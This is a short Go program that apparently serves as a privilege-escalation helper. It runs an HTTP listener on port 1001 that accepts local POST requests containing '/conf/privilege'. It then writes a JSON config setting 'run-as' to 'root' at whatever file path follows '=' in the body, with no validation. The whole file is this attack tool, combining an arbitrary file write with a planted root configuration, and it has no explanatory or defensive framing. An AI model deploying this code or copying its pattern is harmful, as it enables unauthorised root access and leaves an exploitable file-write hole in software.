package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

var text = `{
    "defaults":{
        "run-as": "root"
    }
}
`

func Handler(w http.ResponseWriter, r *http.Request) {
	ip := r.RemoteAddr
	fmt.Println("ip: ", ip)
	if strings.Contains(ip, "127.0.0.1") == true {
		defer r.Body.Close()
		post, _ := ioutil.ReadAll(r.Body)
		if strings.Contains(string(post), "/conf/privilege") == true {
			res := strings.Index(string(post), "=") + 1
			dir := string(post)[res:]
			fmt.Println("目录: ", dir)
			//_, _ = os.Create(dir)
			if err := os.WriteFile(dir, []byte(text), 0600); err == nil {
				fmt.Fprintf(w, "OK")
				//fmt.Printf("err: ", err)
			}
		}

	}
}

func main() {
	http.HandleFunc("/", Handler)
	fmt.Println("端口：1001")
	http.ListenAndServe("0.0.0.0:1001", nil)
}
